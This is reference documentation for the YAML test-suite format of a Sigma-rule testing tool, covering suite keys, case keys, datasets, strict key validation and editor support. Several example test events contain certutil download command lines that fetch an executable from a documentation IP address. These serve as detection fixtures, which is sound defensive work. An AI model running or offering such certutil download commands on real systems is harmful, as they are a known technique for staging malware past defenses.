# Test Suite Format

A suite is one YAML file that pairs a Sigma rule with the events it should and
should not fire on. This is the complete reference for that file. For a
walkthrough, start with [writing-suites.md](writing-suites.md).

<!-- ------------------------------------------------------------ -->

## The Sidecar Convention

A suite lives next to the rule it tests and is named for it:

```
rules/certutil_download/
├── rule.yml           # the Sigma rule
└── rule.test.yml      # its suite
```

Three rules govern the layout:

- **One suite per rule.** The suite names its rule with the `rule:` key. A file
  is a suite if and only if its name ends in `.test.yml`.
- **Paths are relative to the suite file.** `rule:`, `config:`, and `dataset:`
  all resolve from the directory containing the suite, never from the working
  directory. A suite is therefore movable and the tree is relocatable.
- **Discovery is by suffix.** Point `ordeal run` at a file or a directory;
  directories are walked recursively for `*.test.yml`. Suites are processed in
  sorted path order, so output is deterministic.

The convention is the index. There is no manifest to keep in sync and no central
test directory to drift — if a rule has no `.test.yml` beside it, it is untested,
and `ordeal lint` says so.

<!-- ------------------------------------------------------------ -->

## Complete Example

```yaml
# yaml-language-server: $schema=https://principlebreach.com/schema/ordeal/suite.schema.json

# The rule under test. Required. Relative to this file.
rule: rule.yml

# Optional sigma-go field-mapping configs, applied in order. Use these when the
# rule is written in Sigma taxonomy but your events arrive in a source's own
# field names.
config:
  - ../configs/sysmon.yml

# Optional. Set false to opt this suite out of adversarial mutation — for a rule
# that is deliberately broad, or one whose gaps are documented and accepted.
# Defaults to true.
mutate: true

cases:
  # --- Positive: the rule must fire -------------------------------------
  - name: certutil urlcache download fires     # required, unique in this suite
    event:                                     # required unless dataset is set
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -urlcache -split -f http://198.51.100.10/a.exe a.exe'
    match: true                                # optional, defaults to true
    selections:                                # optional, positive inline cases only
      - selection_img
      - selection_flags

  # --- Positive: match defaults to true, so it can be omitted -----------
  - name: certutil verifyctl fires
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -verifyctl -f http://198.51.100.10/a.exe'

  # --- Negative: the rule must not fire ---------------------------------
  - name: certutil dump is benign
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -dump C:\cert.cer'
    match: false

  # --- Dataset: assert against captured telemetry -----------------------
  - name: production certutil traffic stays quiet
    dataset: telemetry/certutil_baseline.jsonl  # relative to this file
    match: false
```

<!-- ------------------------------------------------------------ -->

## Suite Keys

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `rule` | string | yes | — | Path to the Sigma rule under test, relative to the suite file. |
| `config` | list of string | no | none | sigma-go field-mapping config paths, relative to the suite file, applied in order. |
| `mutate` | boolean | no | `true` | Set `false` to exclude this suite from `ordeal mutate`. |
| `cases` | list of case | yes | — | The expectations. At least one. |

### rule

```yaml
rule: rule.yml
```

The rule is parsed once per suite and compiled with any configs, then reused for
every case. It is an unmodified Sigma rule — Ordeal adds nothing to it and
requires nothing of it. A rule that fails to parse is reported as an error against
the suite, not as a failed case.

### config

```yaml
config:
  - ../configs/sysmon.yml
  - ../configs/windows-audit.yml
```

Sigma configs supply field mappings and log-source rewrites. Apply them when the
rule speaks Sigma taxonomy and your events do not. Configs are applied in the
order given, so a later config overrides an earlier one.

Mapping happens here and only here. Events are matched exactly as written — see
[Event Fields](#event-fields).

### mutate

```yaml
mutate: false
```

Excludes the whole suite from `ordeal mutate`. Use it sparingly and comment the
reason. A suite opted out of mutation is a suite whose gaps nobody is measuring.

### cases

A list. Empty is an error — a suite that asserts nothing is worse than no suite,
because it reports green.

<!-- ------------------------------------------------------------ -->

## Case Keys

| Key | Type | Required | Default | Description |
| --- | --- | --- | --- | --- |
| `name` | string | yes | — | Unique name within the suite. Appears in every output format. |
| `event` | map | one of | — | Inline event. Exactly one of `event` or `dataset`. |
| `dataset` | string | one of | — | Path to a telemetry file. Exactly one of `event` or `dataset`. |
| `match` | boolean | no | `true` | The expected verdict. |
| `selections` | list of string | no | none | Named selections that must have fired. Positive inline cases only. |

### name

```yaml
- name: certutil urlcache download fires
```

Required, and unique within the suite — a duplicate name is a load error, because
two cases reporting under one name make a failure impossible to locate. Name the
behavior, not the rule: `certutil urlcache download fires` outlives a rule rename.

### event

```yaml
event:
  Image: 'C:\Windows\System32\certutil.exe'
  CommandLine: 'certutil.exe -urlcache -f http://198.51.100.10/a.exe a.exe'
  ParentImage: 'C:\Windows\explorer.exe'
```

A flat map of field name to value, in the taxonomy the rule expects after configs
are applied. Values are strings, numbers, or booleans. It must not be empty.

### dataset

```yaml
- name: production certutil traffic stays quiet
  dataset: telemetry/certutil_baseline.jsonl
  match: false
```

Loads events from a file instead of declaring them inline. Use it to assert a rule
against captured telemetry — a day of baseline process creation, an EVTX export
from a lab detonation, a replayed incident.

- **Path** is relative to the suite file.
- **Format** is chosen by extension: `.json` (a JSON array of objects, a single
  object, or an object wrapping the records under `records`) and `.jsonl` /
  `.ndjson` (one JSON object per line, blank lines skipped).
- **Every event must produce the expected verdict.** With `match: false`, no event
  may fire; with `match: true`, all of them must. The case reports one result, not
  one per event, and a failure says how many of how many matched:
  `3/10 dataset events matched, expected match=true for all`.
- **An empty file is an error**, not a pass. An all-blank `.jsonl` fails loudly
  rather than reporting a vacuous green.
- **Nested records are flattened** — EVTX-rendered `EventData` and winlogbeat
  documents are reduced to the flat shape the engine matches on. A UTF-8 BOM is
  tolerated. Field names are never renamed; that is what `config:` is for.
- **Dataset cases are not mutated.** Mutation attacks a single known-good positive
  event; see [mutators.md](mutators.md).

In `--format json`, read a dataset case's result from `pass` and `error`, not from
`actual`. For a dataset case `actual` means *at least one event matched*, which is
not the pass condition — the exact ratio is in `error`.

Keep at least one inline positive `event:` case on every rule. A rule whose only
positive case is a dataset gets zero adversarial coverage: `ordeal run` asserts it,
and `ordeal mutate` skips it entirely.

`event` and `dataset` are mutually exclusive, and one of them is required.

### match

```yaml
match: false
```

The expected verdict. Defaults to `true`, because positive cases dominate and the
omission reads cleanly. Be explicit on negative cases — `match: false` is the line
a reviewer looks for.

### selections

```yaml
selections:
  - selection_img
  - selection_flags
```

Asserts that these named selections from the rule's `detection` block actually
fired. The case fails if any listed selection did not, and the report names the
ones that did not.

This is the assertion that catches a degraded condition. A rule whose `condition`
silently loosens from `selection_img and selection_flags` to `selection_img` still
matches the positive event — and now alerts on every certificate operation on the
estate. Only `selections` catches that before it ships.

Valid only on a positive inline case:

- Asserting selections with `match: false` is an error. Nothing fired; there is
  nothing to assert.
- Asserting selections on a `dataset` case is an error. The case covers many
  events, so a per-selection verdict is not well defined.

<!-- ------------------------------------------------------------ -->

## Event Fields

Ordeal does not interpret field names. It hands the event to the rule exactly as
written, with `config:` mappings applied, and asks the engine for a verdict.
Consequences worth knowing:

- **Field names must match the rule's taxonomy.** `CommandLine` is not
  `process.command_line`. If your source uses different names, add a config —
  do not rewrite the rule or the fixture.
- **A misspelled field is not an error.** `Commandline` is a valid field name that
  the rule simply does not reference. The case will fail, not error, and the
  reason will not be obvious. Copy field names from the rule.
- **Mutation targets command fields only.** `CommandLine`, `ParentCommandLine`,
  script-block text and their source-specific spellings are attacked; `Image`,
  path fields, hashes, and users are not, because an attacker does not control
  how the kernel logs them. See [mutators.md](mutators.md).

Keep fixtures honest. Paste the command line from real telemetry, then strip the
identifying detail and replace indicators with documentation ranges
(`198.51.100.0/24`, `example.com`). Suites get committed, scanned, and shared.

## YAML Notes

- **Single-quote Windows paths.** `'C:\Windows\System32\cmd.exe'` is literal;
  `"C:\Windows"` is a double-quoted scalar where `\W` is an invalid escape.
- **Quote anything starting with a flag character.** `-enc` at the head of a plain
  scalar is fine, but quoting is safer and reads consistently.
- **The file must be a single YAML document.** Multi-document files are not
  supported; one suite per file.

<!-- ------------------------------------------------------------ -->

## Strict Unknown Keys

Ordeal rejects any key it does not recognize, at every level, and fails the load
with exit code `2`:

```yaml
cases:
  - name: certutil urlcache download fires
    event:
      CommandLine: 'certutil.exe -urlcache'
    matches: true      # typo: the key is 'match'
```

```
ordeal: rules/certutil/rule.test.yml: yaml: unmarshal errors:
  line 5: field matches not found in type testcase.Case
```

This is deliberate. The alternative — silently ignoring the unknown key — leaves
`matches: true` inert, `match` defaulted to `true`, and the assertion the author
meant to write quietly absent. A typo'd assertion must fail loudly, not pass
green. The same applies to `selection:` for `selections:`, `rules:` for `rule:`,
and every other near miss.

The strictness extends to the loader's other invariants. All of these are load
errors, not case failures:

| Condition | Message |
| --- | --- |
| `rule` absent | `missing required field 'rule'` |
| `cases` empty or absent | `suite has no cases` |
| A case with no `name` | `cases[N]: every case must have a 'name'` |
| Two cases sharing a name | `cases[N]: duplicate case name "..."` |
| Neither `event` nor `dataset` | `case "...": one of 'event' or 'dataset' is required` |
| Both `event` and `dataset` | `case "...": 'event' and 'dataset' are mutually exclusive` |
| `selections` with `match: false` | `case "...": 'selections' cannot be asserted when match is false` |
| `selections` on a dataset case | `case "...": 'selections' cannot be asserted on a dataset case` |

Load errors exit `2` — the invocation is wrong. Case failures exit `1` — the
detection is wrong. Keep the two apart in CI; see [ci.md](ci.md).

<!-- ------------------------------------------------------------ -->

## Editor Support

A JSON Schema for this format ships in [`schema/suite.schema.json`](../schema/suite.schema.json).
Add the hint as the first line of a suite and any editor running the YAML
Language Server — VS Code, Neovim, JetBrains — gives you completion, hover
documentation, and inline errors:

```yaml
# yaml-language-server: $schema=https://principlebreach.com/schema/ordeal/suite.schema.json
rule: rule.yml
cases:
  - name: certutil urlcache download fires
    event:
      Image: 'C:\Windows\System32\certutil.exe'
      CommandLine: 'certutil.exe -urlcache -f http://198.51.100.10/a.exe a.exe'
```

To apply it across a repository without a per-file comment, map it once in your
editor's YAML settings:

```json
{
  "yaml.schemas": {
    "https://principlebreach.com/schema/ordeal/suite.schema.json": "**/*.test.yml"
  }
}
```

The schema is closed — `additionalProperties: false` at every level — so it
reports the same typos the loader does, while you type rather than in CI. It
encodes the mutual exclusion of `event` and `dataset` and both `selections`
restrictions. It is a convenience, not the authority: the loader in
`internal/testcase` is the specification.

---

<sub>Built by <a href="https://principlebreach.com">Principle Breach</a> — offensive security research.</sub>
